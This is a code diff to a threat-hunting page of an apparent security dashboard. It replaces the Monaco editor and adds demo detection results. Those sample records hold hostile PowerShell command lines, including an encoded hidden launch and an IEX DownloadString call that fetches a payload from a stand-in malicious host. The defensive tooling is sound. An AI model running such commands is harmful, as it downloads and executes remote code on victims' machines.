@@ -24,7 +24,6 @@
  */
 
 import { useEffect, useMemo, useRef, useState } from 'react';
-import dynamic from 'next/dynamic';
 import useSWR from 'swr';
 import { clsx } from 'clsx';
 import { format, formatDistanceToNow } from 'date-fns';
@@ -45,15 +44,11 @@ import { ErrorState } from '@/components/ui/ErrorState';
 import { EmptyState } from '@/components/ui/EmptyState';
 import { demoFallback } from '@/lib/demoFallback';
 
-// Monaco is heavy and SSR-incompatible; load it client-side only.
-const MonacoEditor = dynamic(
-  () => import('@monaco-editor/react').then((mod) => mod.default),
-  { ssr: false, loading: () => <Skeleton className="h-64 w-full rounded-lg" /> },
-);
+import { SafeCodeEditor } from './SafeCodeEditor';
 
 // ─── Constants ────────────────────────────────────────────────────────────────
 
-type Lang = NonNullable<HuntQuery['language']>;
+export type Lang = NonNullable<HuntQuery['language']>;
 
 const LANGS: Array<{ id: Lang; label: string; monaco: string }> = [
   { id: 'kql', label: 'KQL', monaco: 'plaintext' },
@@ -121,6 +116,55 @@ LIMIT 200`,
 | SORT @timestamp DESC
 | LIMIT 200`,
 };
+
+// ─── Demo fallback ────────────────────────────────────────────────────────────
+
+// Deterministic timestamps — no Date.now() to avoid SSR hydration mismatches.
+const DEMO_RESULTS: HuntResult[] = [
+  {
+    id: 'r-001',
+    timestamp: '2026-05-06T11:48:00Z',
+    source: 'crowdstrike',
+    severity: 'high',
+    fields: {
+      host: 'WORKSTATION-042',
+      user: 'john.doe',
+      'process.name': 'powershell.exe',
+      'process.command_line':
+        'powershell.exe -nop -w hidden -enc JABXAGUAYgBDA...',
+      'process.parent.name': 'EXCEL.EXE',
+    },
+    highlight: 'powershell.exe -nop -w hidden -enc',
+  },
+  {
+    id: 'r-002',
+    timestamp: '2026-05-06T11:19:00Z',
+    source: 'defender',
+    severity: 'critical',
+    fields: {
+      host: 'SERVER-DC01',
+      user: 'svc_admin',
+      'process.name': 'powershell.exe',
+      'process.command_line':
+        "powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://malware.xyz/payload')\"",
+      'network.destination.ip': '185.220.101.45',
+    },
+    highlight: 'IEX (New-Object Net.WebClient).DownloadString',
+  },
+  {
+    id: 'r-003',
+    timestamp: '2026-05-06T10:00:00Z',
+    source: 'splunk',
+    severity: 'medium',
+    fields: {
+      host: 'WORKSTATION-019',
+      user: 'maria.lin',
+      'process.name': 'powershell.exe',
+      'process.command_line':
+        'powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\maria.lin\\setup.ps1',
+    },
+  },
+];
 
 const DEMO_SAVED: SavedSearch[] = [
   {
@@ -603,16 +647,14 @@ function ResultRow({ result }: { result: HuntResult }) {
           </div>
           <div className="mt-3 flex flex-wrap items-center gap-2">
             <button
-              onClick={() => copyToClipboard(JSON.stringify(result.raw, null, 2))}
+              onClick={() => copyToClipboard(JSON.stringify(result.fields, null, 2))}
               className="rounded border border-slate-700/70 bg-slate-800/40 px-2 py-1 text-[11px] text-slate-300 transition-colors hover:border-slate-600 hover:bg-slate-700/40"
             >
               Copy JSON
             </button>
             <button
               onClick={() => {
-                const host = result.raw?.host;
-                const url = host ? `/graph?entity=${encodeURIComponent(String(host))}` : '/graph';
-                window.location.href = url;
+                const host = result.fields.host;
               }}
               className="rounded border border-slate-700/70 bg-slate-800/40 px-2 py-1 text-[11px] text-slate-300 transition-colors hover:border-slate-600 hover:bg-slate-700/40"
             >
@@ -636,7 +678,6 @@ export function HuntView() {
   const [runError, setRunError] = useState<unknown>(null);
   const [activeSavedId, setActiveSavedId] = useState<string | null>(null);
   const [activeSavedHuntId, setActiveSavedHuntId] = useState<string | null>(null);
-  const editorRef = useRef<unknown>(null);
   /**
    * Whether the *backend* said these results are illustrative.
    *
@@ -1126,27 +1167,11 @@ export function HuntView() {
             </div>
 
             <div className="bg-[#0d1117]">
-              <MonacoEditor
+              <SafeCodeEditor
                 height="280px"
-                language={LANGS.find((l) => l.id === language)?.monaco ?? 'plaintext'}
+                language={language}
                 value={query}
                 onChange={(v) => setQuery(v ?? '')}
-                onMount={(editor) => {
-                  editorRef.current = editor;
-                }}
-                theme="vs-dark"
-                options={{
-                  minimap: { enabled: false },
-                  fontSize: 13,
-                  fontFamily:
-                    "'JetBrains Mono', 'Fira Code', ui-monospace, monospace",
-                  lineNumbers: 'on',
-                  scrollBeyondLastLine: false,
-                  renderLineHighlight: 'line',
-                  smoothScrolling: true,
-                  tabSize: 2,
-                  wordWrap: 'on',
-                }}
               />
             </div>
           </div>
